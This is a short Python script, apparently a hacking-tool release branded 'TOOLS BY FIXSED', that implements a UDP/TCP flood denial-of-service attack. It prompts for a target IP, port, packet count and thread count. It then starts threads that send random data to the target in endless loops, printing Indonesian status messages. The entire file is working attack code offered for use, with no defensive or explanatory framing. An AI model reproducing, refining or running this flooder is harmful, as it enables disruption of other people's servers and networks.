import random
import socket
import threading
import os
import colorama
from colorama import Fore, Back, Style
colorama.init()


os.system("clear")
# Fore.RED
# Style.RESET_ALL

print(Fore.RED)
print("------- TOOLS BY FIXSED ------- \n")

print(Style.RESET_ALL)

print(Fore.GREEN)
ip = str(input("IP :"))
port = int(input("PORT :"))
choice = str(input("UDP(y/n) :"))
times = int(input("PAKET :"))
threads = int(input("THREADS :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[✅]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			
			print(i +" Mengirim paket!!!")
		except:
			print("[!] Error!!!")
			

def run2():
	data = random._urandom(16)
	i = random.choice(("[✅]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				
			print(i +" Mengirim paket!!!")
		except:
			s.close()
			print("[*] Error")
			

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()